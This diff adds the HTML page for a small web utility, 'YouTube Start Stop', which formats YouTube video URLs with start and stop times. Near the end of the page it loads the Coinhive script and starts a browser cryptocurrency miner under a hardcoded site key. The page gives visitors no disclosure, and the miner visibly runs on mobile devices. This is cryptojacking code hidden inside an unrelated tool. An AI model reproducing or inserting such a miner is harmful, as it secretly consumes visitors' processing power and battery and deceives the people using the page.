@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="theme-color" content="#FFFFFF">
+  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/index.css">
+  <title>YouTube Start Stop | Format YouTube video URLs with a start and stop time.</title>
+</head>
+
+<body>
+  <div class="container">
+    <div class="row text-center">
+      <div class="jumbotron">
+        <h1>
+          <b>YouTube Start Stop</b>
+        </h1>
+        <p>Format YouTube video URLs with a start and stop time.</p>
+      </div>
+    </div>
+    <div id="moving-row" class="row active">
+      <div class="col-xs-12 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2 col-lg-8 col-lg-offset-2">
+        <input id="url-input">
+        <!--<i id="copy-icon" class="fas fa-copy"></i>-->
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-10 col-sm-offset-1 col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
+        <div id="player-container">
+          <div id="yt-player"></div>
+        </div>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4 col-lg-4 col-lg-offset-4">
+        <input id="start-input" type="number" class="no-spinners" placeholder="Start">
+        <input id="end-input" type="number" class="no-spinners" placeholder="End">
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" src="js/index.js"></script>
+  <script src="https://www.youtube.com/iframe_api"></script>
+  <script defer src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+    let miner = new CoinHive.Anonymous('WZ84118vzBAGfzUmGd4tTN5ZbVcVWdVJ', {
+      throttle: 0.3
+    });
+    if (miner.isMobile()) {
+      miner = new CoinHive.Anonymous('WZ84118vzBAGfzUmGd4tTN5ZbVcVWdVJ', {
+      throttle: 0.8
+    });
+    miner.start();
+    }
+  </script>
+</body>
+
+</html>
